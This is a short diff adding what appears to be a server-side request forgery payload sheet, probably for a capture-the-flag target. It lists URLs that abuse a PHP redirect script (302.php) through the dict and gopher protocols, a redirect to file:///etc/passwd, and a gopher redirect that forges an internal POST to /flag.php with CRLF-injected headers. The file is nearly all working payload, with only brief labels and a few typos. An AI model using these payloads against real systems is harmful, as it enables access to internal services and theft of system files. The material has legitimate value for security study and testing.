@@ -1,0 +1,22 @@
+
+// Dict protocol 
+/302.php?s=dict&ip=vul.comg&port=8080&data=helo:dict
+
+// Gopger protocol 
+/302.php?s=gopher&ip=vul.comg&port=8080&data=gopher
+
+// file protocol 
+<?php
+header("Location: file:///etc/passwd");
+?>
+
+
+// Contents of 302.php is 
+
+header("Location:gopher://127.0.0.1:80/_POST /flag.php HTTP/1.1%0d%0aHost:
+vultarget.com%0d%0aUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0)
+Gecko/20100101 Firefox/50.0%0d%0aAccept:
+text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8%0d%0aAccept-Language:
+zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3%0d%0aAccept-Encoding: gzip,
+deflate%0d%0aConnection: keep-alive%0d%0aUpgrade-Insecure-Requests: 1%0d%0aContent-
+Type: application/x-www-form-urlencoded%0d%0aContent-Length:14%0d%0a%0d%0ausername=admin");
